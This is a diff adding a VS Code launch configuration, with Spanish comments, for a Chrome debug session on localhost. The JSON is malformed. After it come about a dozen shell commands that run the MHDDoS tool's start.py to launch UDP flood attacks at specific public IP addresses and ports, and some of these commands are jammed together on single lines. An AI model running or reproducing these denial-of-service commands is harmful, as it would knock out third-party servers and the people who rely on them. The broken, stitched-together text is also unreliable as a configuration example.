@@ -1,0 +1,29 @@
+{
+    // Use IntelliSense para saber los atributos posibles.
+    // Mantenga el puntero para ver las descripciones de los existentes atributos.
+    // Para más información, visite: https://go.microsoft.com/fwlink/?linkid=830387
+    "version": "0.2.0",
+    "configurations": [
+        
+
+
+        
+        {
+            "type": "chrome",
+            "request": "launch",
+            "name": "Iniciar Chrome para localhost",
+            "url": "http://localhost:8080",
+            "webRoot": "${workspaceFolder}"
+        }
+
+}
+python3 /workspaces/MHDDoS/start.py UDP 143.92.114.164:10016 53 10
+python3 /workspaces/MHDDoS/start.py UDP 38.54.44.190:10015 53 999
+python3 /workspaces/MHDDoS/start.py UDP 98.98.10.58:10015 53 999python3 /workspaces/MHDDoS/start.py UDP 98.98.10.58:10015 53 999
+python3 /workspaces/MHDDoS/start.py UDP 98.98.10.26:10018 53 999python3 /workspaces/MHDDoS/start.py UDP 143.92.126.150:12008 53 999
+python3 /workspaces/MHDDoS/start.py UDP 143.92.114.184:10017 53 999
+python3 /workspaces/MHDDoS/start.py UDP 143.92.114.184:10017 53 999python3 /workspaces/MHDDoS/start.py UDP 38.54.44.140:10016 53 999
+
+python3 /workspaces/MHDDoS/start.py UDP 38.54.44.133:10017 53 999
+python3 /workspaces/MHDDoS/start.py UDP 143.92.114.153:10016 53 999
+python3 /workspaces/MHDDoS/start.py UDP 143.92.114.183:10018 54 999
